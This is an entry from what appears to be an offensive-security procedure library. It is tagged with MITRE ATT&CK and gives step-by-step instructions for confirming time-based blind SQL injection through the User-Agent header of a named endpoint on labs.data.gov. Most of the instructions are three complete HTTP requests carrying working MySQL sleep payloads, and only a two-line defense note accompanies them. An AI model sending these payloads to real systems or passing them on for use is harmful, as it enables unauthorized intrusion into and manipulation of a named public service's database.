---
id: db3d4092-0623-49d1-8b2f-6131750008f6
name: Verify Time-Based SQL Injection Using Sleep Payloads
type: procedure
verified: false
submitted: true
created_at: '2025-12-11T06:10:28.721Z'
updated_at: '2025-12-11T06:10:28.721Z'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - sqli
  - time-based
  - blind-sqli
  - web-vuln
commands:
  - '[[commands/sql-injection-sleep-25s-user-agent]]'
  - '[[commands/sql-injection-sleep-0s-user-agent]]'
  - '[[commands/sql-injection-sleep-6s-user-agent]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1190]]'
---

# Verify Time-Based SQL Injection Using Sleep Payloads

## Summary

This procedure verifies a time-based blind SQL injection vulnerability by injecting sleep payloads with arithmetic operations into the User-Agent header of HTTP requests to the /dashboard/datagov/csv_to_json endpoint on labs.data.gov, observing variable response delays to confirm successful injection without needing to extract data.

## Description

The procedure targets an SQL injection flaw in the handling of the User-Agent HTTP header, where input is not properly sanitized before being incorporated into SQL queries against a MySQL database. By using time-based payloads like sleep() combined with conditional statements and arithmetic, attackers can confirm the vulnerability by measuring response times. This allows manipulation of query logic, potentially leading to data alteration or further exploitation. The target environment is a web application on labs.data.gov with MySQL backend. Expected outcomes include observable delays confirming injection success.

## Requirements

1. Network access to labs.data.gov
2. Ability to send crafted HTTP GET requests (e.g., via curl, Burp Suite, or browser tools)
3. Timing tool to measure response delays

## Defense

Defensive measures and detection strategies:

- Implement proper input sanitization and parameterized queries to prevent SQL injection
- Monitor for anomalous response times and suspicious User-Agent headers in logs

## Objectives

1. Confirm existence of time-based SQL injection
2. Demonstrate control over query execution time
3. Highlight potential for broader database manipulation

## Instructions

### Step 1: Inject 25-Second Delay Payload

**Context**: Send a payload that causes a 25-second sleep to establish a baseline delay.

**Command** ([[commands/sql-injection-sleep-25s-user-agent]]):
```bash
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*
```

> This injects the SQL payload to sleep for 25 seconds if the condition is true, confirming injection by observing the delay.

### Step 2: Inject 0-Second Delay Payload

**Context**: Send a payload that results in zero sleep to contrast with the delayed response.

**Command** ([[commands/sql-injection-sleep-0s-user-agent]]):
```bash
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*
```

> This should result in an immediate response, verifying that the delay is due to the payload arithmetic.

### Step 3: Inject 6-Second Delay Payload

**Context**: Send a payload with different arithmetic to cause a 6-second sleep for further confirmation.

**Command** ([[commands/sql-injection-sleep-6s-user-agent]]):
```bash
GET /dashboard/datagov/csv_to_json HTTP/1.1
Referer: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87'XOR(if(now()=sysdate(),sleep(6*6-30),0))OR'
X-Forwarded-For: 1
X-Requested-With: XMLHttpRequest
Host: labs.data.gov
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*
```

> This injects a payload to sleep for 6 seconds, demonstrating controllable delays.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/sql-injection-sleep-25s-user-agent]]
- [[commands/sql-injection-sleep-0s-user-agent]]
- [[commands/sql-injection-sleep-6s-user-agent]]

## Tools Used



## Tags

- [[sqli]]
- [[time-based]]
- [[blind-sqli]]
- [[web-vuln]]
